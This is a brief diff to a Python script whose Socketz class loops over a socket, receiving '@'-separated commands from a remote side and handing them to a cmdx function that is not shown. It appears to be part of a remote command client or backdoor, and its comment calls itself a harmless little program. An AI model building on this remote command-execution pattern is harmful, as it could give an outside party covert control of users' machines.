@@ -1,6 +1,6 @@
 #!/usr/bin/python
 # -*- coding: UTF-8 -*-
-#这是一个人畜无害的小程序
+#这是一个人畜无害，相当温和，德芙般丝滑的小程序
 import os
 import socket
 import time
@@ -180,6 +180,7 @@ class Socketz():
 
 	def long_tcp(self):
 		while True:
+			self.sock.send("intotcplong".encode("utf-8"))
 			cmd = self.sock.recv(1024).decode("utf-8")
 			cmd = cmd.split("@")
 			data = cmdx(cmd)
